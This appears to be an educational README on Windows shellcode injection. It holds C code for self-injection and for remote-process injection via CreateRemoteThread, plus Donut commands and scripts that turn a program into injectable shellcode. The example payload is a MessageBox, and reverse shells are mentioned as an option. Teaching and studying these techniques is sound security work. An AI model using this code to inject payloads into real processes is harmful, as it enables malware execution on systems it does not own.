# Classic Injection

This folder demonstrates **classic shellcode injection**—a fundamental process injection technique where raw machine code (shellcode) is allocated, written, and executed within a process's memory space.

**Important Disclaimer**: This code is for educational purposes only on systems you own or have explicit authorization to test. Unauthorized injection is illegal.

---

## What Is Classic Shellcode Injection?

Classic shellcode injection is a multi-step process:

1. **Allocate Memory** – Use `VirtualAlloc()` to allocate executable memory in the target process
2. **Write Shellcode** – Use `WriteProcessMemory()` to copy shellcode bytes into the allocated memory
3. **Execute** – Use `CreateThread()` or `CreateRemoteThread()` to execute code at the shellcode address

### In This Folder

The example demonstrates **self-injection** – the process injects shellcode into **itself** (not a remote process). This is simpler than remote injection but illustrates the core concepts.

**Flow:**
```
Classic Injection.exe
    │
    ├─ VirtualAlloc() → Allocate executable memory
    │
    ├─ WriteProcessMemory() → Copy shellcode to memory
    │
    ├─ CreateThread() → Create thread pointing to shellcode
    │
    ├─ Shellcode executes → Payload runs
    │
    └─ WaitForSingleObject() → Wait for completion
```

---

## Code Breakdown

### Memory Allocation

```c
LPVOID HandleMemory = VirtualAlloc(
    NULL,                       // Preferred address (NULL = let OS choose)
    sizeof(shellcode),          // Size to allocate
    MEM_COMMIT,                 // Allocate and commit pages
    PAGE_EXECUTE_READWRITE      // Make memory executable + readable + writable
);
```

**Why `PAGE_EXECUTE_READWRITE`?**
- `PAGE_EXECUTE` – CPU can execute code from this memory
- `PAGE_READ` – Code can read from this memory
- `PAGE_WRITE` – Code can write to this memory

### Writing Shellcode

```c
SIZE_T bytesWritten;
BOOL RESULT = WriteProcessMemory(
    GetCurrentProcess(),        // Handle to current process
    HandleMemory,               // Remote address (destination)
    shellcode,                  // Local buffer (source)
    sizeof(shellcode),          // Size to copy
    &bytesWritten               // Bytes actually written
);
```

**Why use `WriteProcessMemory` instead of `memcpy`?**
- `memcpy` works for local process memory, but `WriteProcessMemory` is designed for cross-process operations
- In this example, we use it on the current process for consistency with remote injection patterns
- Returns success/failure status and actual bytes written

### Creating Execution Thread

```c
DWORD threadId = 0;
HANDLE hThread = CreateThread(
    NULL,                               // Security attributes (NULL = default)
    0,                                  // Stack size (0 = default 1MB)
    (LPTHREAD_START_ROUTINE)HandleMemory, // Entry point (shellcode address)
    NULL,                               // Thread parameter
    0,                                  // Creation flags (0 = run immediately)
    &threadId                           // Output: Thread ID
);
```

**What happens:**
- New thread created in the current process
- Thread counter-register (`rip`/`eip`) set to `HandleMemory` (shellcode start)
- Thread begins executing shellcode immediately
- Returns a handle to the thread

### Waiting for Completion

```c
WaitForSingleObject(hThread, INFINITE);
```

- Blocks the main thread until the shellcode thread completes
- `INFINITE` means wait indefinitely
- Alternative: Pass timeout value (milliseconds) for timed wait

### Cleanup

```c
CloseHandle(hThread);
VirtualFree(HandleMemory, 0, MEM_RELEASE);
```

- `CloseHandle()` – Releases the thread handle (frees kernel resources)
- `VirtualFree()` – Deallocates the shellcode memory
- `MEM_RELEASE` – Decommit and release pages

---

## Prerequisites

### System Requirements
- Windows 10/11 (examples target modern Windows)
- Administrator privileges recommended
- Isolated test environment **strongly recommended**

### Development Tools
- **C/C++ Compiler:** MSVC (Visual Studio) or MinGW-w64
- **Debugger:** WinDbg, x64dbg, or Visual Studio Debugger (optional)

### Knowledge Requirements
- Understanding of Windows API (VirtualAlloc, CreateThread, etc.)
- Basic knowledge of function pointers and memory addressing
- Understanding of shellcode (position-independent machine code)

---

## Building

### Build with MSVC (Visual Studio Developer Command Prompt)

```cmd
cl /nologo "Classic Injection.C" user32.lib
```

This produces `Classic Injection.exe` in the current directory.

### Build with MinGW (gcc)

```bash
gcc -o "Classic Injection.exe" "Classic Injection.C"
```

### Build with CMake (if available)

```bash
cmake .
cmake --build .
```

---

## Running

### Execute the Program

```powershell
.\Classic\ Injection.exe
```

### Expected Output

```
Memory allocated successfully at address: 0x00000000004A0000
Wrote XX bytes to allocated memory.
Thread created successfully with ID: 1234
[Shellcode executes here]
```

The output depends on the shellcode payload:
- **MessageBox Shellcode** – A window appears with a message
- **Reverse Shell Shellcode** – Connection established to attacker
- **Custom Payload** – Depends on implementation

---

## Generating Shellcode

The `shellcode` array in the code must be filled with actual machine code bytes. You can use **Donut** (as documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode:

### Step 1: Create a Payload PE

Build a simple C program (e.g., MessageBox):

```c
#include <windows.h>

int main() {
    MessageBoxA(NULL, "Injected Code!", "Success", MB_OK);
    return 0;
}
```

Compile:
```bash
gcc -o payload.exe payload.c -luser32
```

### Step 2: Convert to Shellcode with Donut

```powershell
donut.exe -i payload.exe -o payload.bin -z 2 -k 2 -e 3 -b 1
```

### Step 3: Convert Binary to Hex Format

**PowerShell:**
```powershell
$bytes = [System.IO.File]::ReadAllBytes('payload.bin')
$hex = -join ($bytes | ForEach-Object { '0x' + $_.ToString('X2') + ',' })
Write-Output $hex
```

**Python:**
```python
with open('payload.bin', 'rb') as f:
    data = f.read()
    hex_str = ', '.join([f'0x{byte:02x}' for byte in data])
    print(hex_str)
```

### Step 4: Insert into Code

Replace the empty shellcode array:

```c
unsigned char shellcode[] = {
    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 
    0x0e, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
    // ... rest of bytes ...
};
```

---

## How It Works: Step-by-Step

```
┌─────────────────────────────────────────────────────────┐
│ Classic Injection.exe Start                             │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ VirtualAlloc()                                          │
│ ├─ Allocates 1000+ bytes of executable memory          │
│ └─ Returns address: 0x00000000004A0000                 │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ WriteProcessMemory()                                    │
│ ├─ Copies shellcode bytes to allocated memory          │
│ └─ Memory now contains machine code ready to execute   │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ CreateThread()                                          │
│ ├─ Creates new thread in current process               │
│ ├─ Entry point: 0x00000000004A0000 (shellcode address) │
│ └─ Thread immediately begins executing shellcode       │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ Shellcode Execution                                     │
│ ├─ Runs in allocated memory                            │
│ ├─ Executes payload (MessageBox, reverse shell, etc.)  │
│ └─ Thread completes and exits                          │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ WaitForSingleObject()                                   │
│ └─ Main thread waits for shellcode thread to finish    │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ Cleanup                                                 │
│ ├─ CloseHandle(hThread) – Release thread handle        │
│ └─ VirtualFree() – Deallocate shellcode memory         │
└────────────┬────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────┐
│ Program Exit                                            │
└─────────────────────────────────────────────────────────┘
```

---

## Advantages of Classic Injection

✓ **Simple to implement** – Just three core API calls
✓ **Reliable** – Works across Windows versions
✓ **Fast** – Minimal overhead
✓ **Educational** – Clear demonstration of core concepts

---

## Limitations and Risks

✗ **Self-injection only** – This example injects into the same process. Remote injection requires additional APIs (`OpenProcess`, `CreateRemoteThread`, `WriteProcessMemory` on another process)
✗ **Requires shellcode** – Must have valid position-independent code
✗ **Detectable** – Creates obvious artifacts (allocated executable memory, unexpected threads)
✗ **No stealth** – EDR/AV may easily detect this pattern

---

## Extending to Remote Injection

To inject into **another process** instead of self-injection:

```c
// 1. Open target process
HANDLE hProcess = OpenProcess(
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
    FALSE,
    targetPID
);

// 2. Allocate memory in target process
LPVOID remoteBuffer = VirtualAllocEx(
    hProcess,
    NULL,
    sizeof(shellcode),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
);

// 3. Write shellcode to target process
WriteProcessMemory(
    hProcess,
    remoteBuffer,
    shellcode,
    sizeof(shellcode),
    NULL
);

// 4. Create thread in target process
HANDLE hRemoteThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)remoteBuffer,
    NULL,
    0,
    NULL
);

// 5. Cleanup
CloseHandle(hRemoteThread);
CloseHandle(hProcess);
```

**Key Differences:**
- Use `OpenProcess()` to get a handle to the target process
- Use `VirtualAllocEx()` instead of `VirtualAlloc()` (specify target process)
- Use `CreateRemoteThread()` instead of `CreateThread()` (specify target process)

---

## Debugging

### Using WinDbg

```
windbg.exe "Classic Injection.exe"

# Set breakpoint at memory allocation
bp ntdll!NtAllocateVirtualMemory

# Step through execution
p  ; Step over
t  ; Trace into

# View memory at allocated address
db 0x00000000004A0000 L100
```

### Using x64dbg

1. Open `Classic Injection.exe`
2. Set breakpoint at `VirtualAlloc` return
3. Step to `WriteProcessMemory`
4. Observe shellcode bytes written to memory
5. Step to `CreateThread` and watch execution

---

## Legal and Ethical Considerations

**Authorization Required:**
- Only use on systems you own
- Never test on systems without explicit written permission
- Works in authorized penetration testing scenarios only

**Responsible Disclosure:**
- Report findings through proper channels
- Give organizations time to patch
- Follow your organization's security policies

**Legal Implications:**
- Unauthorized code injection is illegal (Computer Fraud and Abuse Act in US)
- Similar laws exist in other jurisdictions
- Violations can result in criminal charges

---

## References

- [VirtualAlloc Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [WriteProcessMemory Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [CreateThread Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
- [CreateRemoteThread Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/)

---

## Disclaimer

This code and documentation are provided for educational purposes on authorized systems only. Unauthorized process injection is illegal and violates computer fraud laws. You are solely responsible for compliance with applicable laws and organizational policies.
